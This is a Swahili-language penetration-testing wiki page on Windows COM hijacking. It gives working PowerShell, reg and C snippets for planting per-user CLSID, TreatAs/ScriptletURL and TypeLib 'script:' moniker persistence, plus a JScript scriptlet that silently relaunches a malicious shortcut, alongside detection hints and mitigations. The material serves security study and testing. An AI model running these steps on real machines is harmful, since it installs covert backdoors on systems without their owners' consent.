# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Kutafuta COM components ambazo hazipo

Kwa kuwa watumiaji wanaweza kurekebisha thamani za HKCU, **COM Hijacking** inaweza kutumika kama **persistence mechanism**. Kwa kutumia `procmon`, ni rahisi kupata COM registries zinazotafutwa lakini bado hazipo na ambazo mshambuliaji anaweza kuziunda. Filters za kawaida:

- Operesheni za **RegOpenKey**.
- ambapo _Result_ ni **NAME NOT FOUND**.
- na _Path_ inaishia na **InprocServer32**.

Tofauti muhimu wakati wa hunting:

- Pia tafuta keys za **`LocalServer32`** ambazo hazipo. Baadhi ya COM classes ni out-of-process servers na zitaanzisha EXE inayodhibitiwa na mshambuliaji badala ya DLL.
- Tafuta operesheni za registry za **`TreatAs`** na **`ScriptletURL`** pamoja na `InprocServer32`. Maudhui ya hivi karibuni ya detection na maandishi kuhusu malware huendelea kuzitaja kwa sababu ni nadra sana kuliko COM registrations za kawaida, hivyo zina signal nyingi.
- Nakili **`ThreadingModel`** halali kutoka kwa `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` unapounda registration sawa katika HKCU. Kutumia model isiyo sahihi mara nyingi huharibu activation na kufanya hijack iwe rahisi kutambuliwa.<sup>[[3]](#references)</sup>
- Kwenye mifumo ya 64-bit, kagua views za 64-bit na 32-bit (`procmon.exe` dhidi ya `procmon64.exe`, `HKLM\Software\Classes` na `HKLM\Software\Classes\WOW6432Node`) kwa sababu applications za 32-bit zinaweza kupata COM registration tofauti.

Baada ya kuamua ni COM ipi ambayo haipo utakayoiga, tekeleza commands zifuatazo. _Kuwa mwangalifu ukiamua kuiga COM inayopakiwa kila baada ya sekunde chache, kwa sababu hilo linaweza kuwa kupita kiasi._

```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### Vipengele vya COM vya Task Scheduler vinavyoweza kutekwa

Windows Tasks hutumia Custom Triggers kuita objects za COM na kwa kuwa hutekelezwa kupitia Task Scheduler, ni rahisi zaidi kutabiri wakati zitakapoanzishwa.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Ukikagua matokeo, unaweza kuchagua moja ambayo itatekelezwa **kila mtumiaji anapoingia** kwa mfano.

Sasa ukitafuta CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** katika **HKEY\CLASSES\ROOT\CLSID** na katika HKLM na HKCU, kwa kawaida utagundua kwamba thamani hiyo haipo katika HKCU.

```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
               ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

Kisha, unaweza tu kuunda ingizo la HKCU, na kila mtumiaji anapoingia, backdoor yako itaendeshwa.

## Usajili wa COM Ulioachwa Bila DLL na Custom Marshaling

Usajili wa COM wa mashine nzima unaweza kuwa njia ya DLL-planting bila kubadilisha registry. Tafuta thamani ya `InprocServer32` ambayo DLL yake haipo na ambayo njia yake ya mwisho inaweza kuundwa au kurekebishwa na mtumiaji mwenye ruhusa chache. Kuweka DLL yenye jina halisi husababisha mchakato wowote unaowasha CLSID kupakia msimbo wa mshambuliaji. Katika mfano wa CrossDevice, njia iliyosajiliwa ilikuwa `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll`, kwa hiyo mtumiaji wa kawaida angeweza kuunda folda ndogo na DLL iliyokosekana.<sup>[[5]](#references)</sup>

### `IMarshal` kama njia ya kupakia DLL kati ya michakato

Kwa kawaida, COM huwakilisha kiashiria cha kiolesura kwa kutumia `OBJREF` ya kawaida, ambayo huelekeza mpokeaji kurudi kwenye object asili. Object inayotekeleza `IMarshal` inaweza badala yake kutoa `OBJREF` maalum. Mbinu yake ya `GetUnmarshalClass` hutoa CLSID ya msimbo utakaojenga upya object katika mchakato unaopokea. CLSID hiyo haihitaji kutambulisha object asili. COM huitafuta kama seva ya ndani ya mchakato na kupakia DLL iliyosajiliwa kabla ya kuelekeza mwito kwa mbinu ya kiolesura iliyoombwa.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

Utekelezaji hasidi wa msingi unahitaji tu kubadilisha CLSID iliyoachwa bila DLL katika `GetUnmarshalClass`.<sup>[[5]](#references)</sup>

```c
HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
    REFIID riid, void *pv, DWORD dest_context,
    void *dest_context_ptr, DWORD flags, CLSID *clsid) override
{
    return CLSIDFromString(L"{DANGLING-CLSID}", clsid);
}
```

Peleka object hii kupitia parameter ya method inayotumia proxy, kama `[in] IUnknown *`. Chaguo jingine ni `CoGetInstanceFromIStorage`, huku object yenye custom marshaling pia ikitekeleza `IStorage` vya kutosha kupita ukaguzi wa ndani. Unmarshaling ya kiotomatiki kwenye remote server hutatua CLSID iliyobadilishwa, hivyo DLL hupakiwa kabla method lengwa haijatekelezwa.<sup>[[5]](#references)</sup>

Primitive hii haiishii kwenye registrations zinazokosekana. Inaweza pia kulazimisha receiver kupakia DLL iliyopo ya custom-unmarshaler na kufichua hitilafu katika njia yake ya kupakia au unmarshaling.<sup>[[5]](#references)</sup>

Mlolongo huu unahitaji masharti yote yafuatayo:<sup>[[5]](#references)</sup>

1. CLSID inayoonekana na mashine inaelekeza kwenye DLL ya in-process inayokosekana au inayoweza kubadilishwa.
2. Attacker anaweza kuweka DLL hiyo kwenye path iliyotatuliwa.
3. COM server ya out-of-process inayoweza kuamilishwa inaendeshwa kwa kiwango cha privilege kinachotakiwa.
4. Server inakubali custom marshaling na inatoa mwito unaotumia proxy ambao husafirisha object ya attacker kuvuka mpaka wa process.

### Tafuta in-process servers zilizobaki bila faili

[OleViewDotNet](https://github.com/tyranid/oleviewdotnet) na [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) zinaweza kuorodhesha database ya COM ya mashine na kujaribu kila server kupitia utatuzi wa kawaida wa module wa Win32. Hii ni bora kuliko `Test-Path` kwa sababu baadhi ya registrations zina jina la faili pekee na hutegemea search path ya loader.<sup>[[5]](#references)</sup>

```powershell
function Test-ComServer($Server) {
    try {
        Use-NtObject ($lib = Import-Win32Module -Path $Server -Flags AsDataFile) { $true }
    } catch { $false }
}

$db = Get-ComDatabase -LoadMode MachineOnly
$classes = Get-ComClass -Database $db -ServerType InProcServer32
$classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
    Sort-Object DefaultServer | Select-Object Name, DefaultServer
```

Chukulia matokeo kama orodha ya wagombea, si uthibitisho wa uwezekano wa kutumia udhaifu. Tatua path kama loader inavyofanya, kisha kagua DACL kwenye parent ya kwanza iliyopo na kwenye DLL inayokusudiwa ikiwa tayari ipo. Faili inayokosekana ina manufaa tu ikiwa mshambuliaji anaweza kuunda au kubadilisha path ambayo COM itatatua kweli.<sup>[[5]](#references)</sup>

### Chagua na uanzishe receiver yenye upendeleo

Kagua madarasa ya COM yanayoweza kuwa wagombea kwa `RunAs`, uhusiano na huduma, interfaces zinazopatikana, na RPC proxies. Darasa lililosanidiwa kwa `SYSTEM` lakini lisiloungwa mkono na huduma yenye jina huenda likashindwa kuwashwa moja kwa moja kwa sababu RPCSS haiwezi kulianzisha. Katika hali hiyo, tafuta kichochezi kisicho na upendeleo kinachoanzisha host yake, kama vile scheduled task inayotekelezeka, na urudie sharti lolote la named-event au IPC linalofanya server iendelee kufanya kazi.<sup>[[5]](#references)</sup>

Kwa mfano, mnyororo dhaifu wa Shell Create Object Handler ulianzisha host yake kwa kuunda global event iliyotarajiwa kabla ya kuendesha scheduled task inayoweza kutekelezwa na mtumiaji.<sup>[[5]](#references)</sup>

```powershell
$ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
Start-ScheduledTask -TaskPath '\Microsoft\Windows\Shell\' -TaskName 'CreateObjectTask'
$ev.Wait()
$object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
```

Linganishia object reference iliyopatikana na host yake, kisha thibitisha identity na marshaling policy. Halafu orodhesha interfaces na ubadilishe proxies zake kuwa IDL ili kupata input parameter kama `IUnknown *` itakayomarshal fake object.<sup>[[5]](#references)</sup>

```powershell
$objref = Get-ComObjRef -Object $object
Get-ComProcess -ProcessId $objref.ProcessId |
    Select-Object Name, User, CustomMarshalAllowed

Get-ComInterface -Object $object
Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
```

### Ulinzi dhidi ya custom-marshaling

Receiver anayefaa hapaswi kukataa custom marshalers zisizoaminika. Ulinzi mbili zinazotumika kwa mchakato mzima ni `EOAC_NO_CUSTOM_MARSHAL` katika capabilities zinazopitishwa kwa `CoInitializeSecurity` na `COMGLB_UNMARSHALING_POLICY_STRONG` inayowekwa kupitia `IGlobalOptions::Set`. Ukiwa na symbols, hali inayolingana inaweza kukaguliwa katika `combase!gCapabilities` na `combase!g_GLBOPT_UnmarshalingPolicy`; NtObjectManager huonyesha matokeo kama `CustomMarshalAllowed` pale ambapo process parser yake inatumia Windows build husika.<sup>[[5]](#references)</sup>

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` huruhusu CLSID moja kuigwa na nyingine.<sup>[[4]](#references)</sup> Kwa mtazamo wa offensive, hii inamaanisha unaweza kuacha CLSID ya awali bila kuigusa, kuunda CLSID ya pili ya kila mtumiaji inayoelekeza kwenye `scrobj.dll`, kisha kuelekeza upya kitu halisi cha COM kwenye kile hasidi kwa kutumia `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Hii ni muhimu wakati:

- programu lengwa tayari huanzisha CLSID thabiti wakati wa kuingia au kuanza kwa programu
- unataka kuelekeza upya kwa kutumia registry pekee badala ya kubadilisha `InprocServer32` ya awali
- unataka kutekeleza scriptlet ya `.sct` ya ndani au ya mbali kupitia thamani ya `ScriptletURL`

Mfano wa mtiririko wa kazi (uliorekebishwa kutoka mbinu za Atomic Red Team zinazopatikana hadharani na utafiti wa zamani kuhusu matumizi mabaya ya COM registry):

```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```

Maelezo:

- `scrobj.dll` husoma thamani ya `ScriptletURL` na kutekeleza `.sct` inayorejelewa, kwa hivyo unaweza kuhifadhi payload kama faili ya ndani au kuipakua kwa mbali kupitia HTTP/HTTPS.
- `TreatAs` ni muhimu hasa pale usajili asilia wa COM unapokuwa kamili na thabiti katika HKLM, kwa sababu unahitaji tu uelekezaji upya mdogo wa kila mtumiaji badala ya kunakili mti mzima.
- Ili kuthibitisha bila kusubiri kichochezi cha kawaida, unaweza kuunda mwenyewe ProgID/CLSID bandia kwa kutumia `rundll32.exe -sta <ProgID-or-CLSID>` ikiwa class lengwa inaunga mkono uanzishaji wa STA.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) hufafanua interfaces za COM na hupakiwa kupitia `LoadTypeLib()`. Seva ya COM inapoundwa, OS inaweza pia kupakia TypeLib husika kwa kukagua funguo za registry chini ya `HKCR\TypeLib\{LIBID}`. Njia ya TypeLib ikibadilishwa na **moniker**, kwa mfano `script:C:\...\evil.sct`, Windows itatekeleza scriptlet TypeLib inapotatuliwa — hivyo kutengeneza persistence fiche inayoanzishwa vipengele vya kawaida vinapotumiwa.

Hali hii imeonekana dhidi ya kidhibiti cha Microsoft Web Browser (ambacho hupakiwa mara nyingi na Internet Explorer, programu zinazopachika WebBrowser, na hata `explorer.exe`).<sup>[[1]](#references)[[2]](#references)</sup>

### Hatua (PowerShell)

1) Tambua TypeLib (LIBID) inayotumiwa na CLSID inayotumika mara kwa mara. Mfano wa CLSID unaotumiwa vibaya mara nyingi katika minyororo ya malware: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).

```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```

2) Elekeza njia ya TypeLib ya kila mtumiaji kwenye scriptlet ya ndani kwa kutumia moniker ya `script:` (hakuna haki za admin zinazohitajika):

```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```

3) Weka JScript `.sct` ndogo inayozindua upya payload yako kuu (kwa mfano, `.lnk` inayotumiwa na chain ya awali):

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
  <script language="JScript">
    <![CDATA[
      try {
        var sh = new ActiveXObject('WScript.Shell');
        // Re-launch the malicious LNK for persistence
        var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
        sh.Run(cmd, 0, false);
      } catch(e) {}
    ]]>
  </script>
</scriptlet>
```

4) Kuanzisha – kufungua IE, programu inayopachika kidhibiti cha WebBrowser, au hata shughuli za kawaida za Explorer kutapakia TypeLib na kutekeleza scriptlet, na kuweka mnyororo wako tayari tena kila unapoingia au kuwasha upya.

Usafishaji
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```

Notes
- Unaweza kutumia mantiki ileile kwa vipengele vingine vya COM vinavyotumika mara kwa mara; kila mara tambua kwanza `LIBID` halisi kutoka `HKCR\CLSID\{CLSID}\TypeLib`.
- Kwenye mifumo ya 64-bit, unaweza pia kujaza subkey ya `win64` kwa watumiaji wa 64-bit.

## References

- [1] [Hijack the TypeLib – Mbinu mpya ya persistence ya COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – Kampeni ya ZipLine: Shambulio la kisasa la phishing linalolenga kampuni za Marekani](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Kuchunguza tena COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [Ufunguo wa CLSID (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
- [5] [Project Zero - Mbinu za Windows Exploitation: Usajili wa COM Object unaoning'inia](https://projectzero.google/2026/09/windows-dangling-com.html)
- [6] [Microsoft Learn - Kiolesura cha IMarshal](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
- [7] [Microsoft Open Specifications - MS-DCOM OBJREF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
{{#include ../../banners/hacktricks-training.md}}

